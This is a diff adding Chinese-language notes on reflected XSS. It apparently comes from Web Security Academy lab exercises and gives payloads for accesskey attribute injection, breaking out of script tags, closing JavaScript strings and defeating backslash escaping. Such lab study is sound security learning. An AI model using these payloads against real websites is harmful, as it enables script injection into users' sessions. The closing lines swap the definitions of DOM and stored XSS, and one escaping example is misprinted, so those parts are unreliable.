@@ -170,7 +170,61 @@ payload example：
 ###### 利用组合键来触发事件
 `您可能会遇到一些网站，它们对尖括号进行编码，但仍允许您注入属性。有时，即使在通常不会自动触发事件的标签（例如规范（canonical）标签）中，这些注入也是可能的。您可以使用 Chrome 上的访问键和用户交互来利用此行为。访问键允许您提供引用特定元素的键盘快捷键。accesskey 属性允许您定义一个字母，当与其他键组合按下时（这些键在不同平台上有所不同），将触发事件。`<br/>
 ![image](https://github.com/user-attachments/assets/4736de3c-dac5-4ff8-aa84-47acbaf22282)
-
-
+payload:
+``` 
+https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+```
+##### （3）js代码中实现的xss
+###### 终止现有脚本
+`在最简单的情况下，可以简单地关闭包含现有 JavaScript 的脚本标记，并引入一些将触发 JavaScript 执行的新 HTML 标记。例如，如果 XSS 上下文如下：`
+```
+<script>
+...
+var input = 'controllable data here';
+...
+</script>
+```
+`然后，您可以使用以下有效负载来突破现有的 JavaScript 并执行您自己的代码：`
+```
+</script><img src=1 onerror=alert(document.domain)>
+```
+`其有效原因是浏览器首先执行 HTML 解析来识别包含脚本块的页面元素，然后才执行 JavaScript 解析来理解和执行嵌入的脚本。`<br/>
+`上述有效载荷使原始脚本被破坏，字符串文字未终止。但这并不妨碍后续脚本以正常方式被解析和执行。`
+![image](https://github.com/user-attachments/assets/91e60eae-d69b-4239-9cf5-8801ed3de655)
+payload:
+```
+'</script><img src=1 onerror=alert(1)>
+```
+###### 解析 JavaScript 字符串(闭合字符串)--尖括号被编码
+payload:
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+###### 单引号被\转义
+![image](https://github.com/user-attachments/assets/1857c3f8-d24c-4f89-9861-92964d7f9f68)
+`某些应用程序会尝试使用反斜杠转义任何单引号字符，以防止输入脱离 JavaScript 字符串。字符前的反斜杠会告诉 JavaScript 解析器该字符应按字面意思解释，而不是作为字符串终止符等特殊字符。在这种情况下，应用程序经常会犯这样的错误：无法转义反斜杠字符本身。这意味着攻击者可以使用自己的反斜杠字符来抵消应用程序添加的反斜杠。`<br/>
+`例如，假设输入：`<br/>
+```
+';alert(document.domain)//
+```
+`会被解析转义为:`
+```
+\';alert(document.domain)//
+```
+`在前面加一个\:`
+```
+\';alert(document.domain)//
+```
+`会被解析转义为:`
+```
+\\';alert(document.domain)//
+notice:
+这里，第一个反斜杠意味着第二个反斜杠被解释为字面意思，而不是特殊字符。这意味着引号现在被解释为字符串终止符，因此攻击成功。
+```
+payload:
+```
+\';alert(1);//
+```
 ### (2) DOM型XSS -- 恶意脚本来自网站的数据库
 ### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
